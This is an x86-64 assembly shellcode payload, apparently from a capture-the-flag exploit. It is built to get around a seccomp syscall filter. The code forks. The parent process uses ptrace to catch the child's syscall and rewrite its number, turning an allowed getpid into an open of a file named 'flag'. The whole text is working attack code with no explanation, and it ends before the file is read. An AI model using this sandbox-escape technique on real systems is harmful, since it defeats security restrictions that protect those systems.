// clone
/* call fork() */
push SYS_fork /* 0x39 */
pop rax
syscall

test rax, rax
jz $+257

// debugger
/* time delay */
mov rdx, 0x30000000
dec rdx
test rdx, rdx
jnz $ - 6
push rax

/* waitpid(childpid, NULL, 0) */
mov rdi, rax
mov rsi, 0
mov rdx, 0
mov r10, 0
mov rax, 0x3d
syscall

/* ptrace(PTRACE_SYSCALL, childpid, NULL, NULL) */
mov rdi, 0x18
mov rsi, [rsp]
mov rdx, 0
mov r10, 0
mov rax, 0x65
syscall

/* waitpid(childpid, NULL, 0) */
mov rdi, [rsp]
mov rsi, 0
mov rdx, 0
mov r10, 0
mov rax, 0x3d
syscall

/* ptrace(PTRACE_GETREGS, childpid, NULL, &regs */
mov rdi, 0xc
mov rsi, [rsp]
mov rdx, 0x0
mov r10, rsp
add r10, 0x400
mov rcx, r10
/* mov rcx, 0x123200 */
mov rax, 0x65
syscall

/* ptrace(PTRACE_SETREGS, childpid, NULL, &regs) */
mov rdi, 0xd
mov rsi, [rsp]
mov rdx, 0
mov r10, rsp
add r10, 0x400
mov r9, r10
add r9, 0x78
/*
mov r10, 0x123200
mov r9, r10
add r9, 0x78
*/
mov qword ptr [r9], 60
mov rax, 0x65
syscall

/* ptrace(PTRACE_DETACH, childpid, NULL, NULL) */
mov rdi, 0x11
mov rsi, [rsp]
mov rdx, 0
mov r10, 0
mov rax, 101
syscall

mov rax, 0x3c
syscall

// debuggee
/* ptrace(PTRACE_TRACEME, 0, NULL, NULL) */
mov rdi, 0
mov rsi, 0
mov rdx, 0
mov r10, 0
mov rax, 101
syscall

/* syscall(SYS_gettid) */
mov rax, 0x27/*0xba*/
syscall

/* syscall(SYS_tkill, pid, SIGSTOP) */
mov rdi, rax
mov rsi, 0x13
mov rax, 0x3e/*0xc8*/
syscall

/* push b'flag\x00' */
push 0x67616c66

/* open(file='rsp', oflag=0, mode=0) */
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 */
/* call open() */
xor rax, rax
mov rax, 39/*getpid*/
syscall

